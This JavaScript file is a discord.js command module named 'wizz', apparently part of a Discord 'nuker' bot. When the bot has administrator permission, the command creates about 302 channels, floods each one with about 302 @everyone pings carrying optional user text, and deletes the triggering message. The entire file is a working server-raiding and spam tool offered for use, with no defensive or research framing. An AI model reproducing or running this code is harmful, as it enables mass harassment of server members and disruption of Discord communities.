const Discord = require('discord.js')
const chalk = require('chalk')

module.exports = {
    name: 'wizz',
    description: 'wizz the server',
    run: async(nuker, message, args) => {
        if(!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(chalk.grey("ERROR: MISSING ADMINISTRATOR PERMISSION!"))

        const text = args.join(' ')

        if(!text) {
            for (let i = 0; i <= 301; i++) {
                message.guild.channels.create('ghosts').then(
                    function (ch, i) {
                        for (let i = 0; i <= 301; i++) {
                            ch.send("@everyone")
                            console.log(chalk.yellowBright("CHANNEL PINGED"))
                        }
                    }
                )
            }
            message.delete()
        } else {
            for (let i = 0; i <= 301; i++) {
                message.guild.channels.create(text).then(
                    function (ch, i) {
                        for (let i = 0; i <= 301; i++) {
                            ch.send(`@everyone ${text}`)
                            console.log(chalk.yellowBright("CHANNEL PINGED"))
                        }
                    }
                )
            }
            message.delete()
        }
    }
}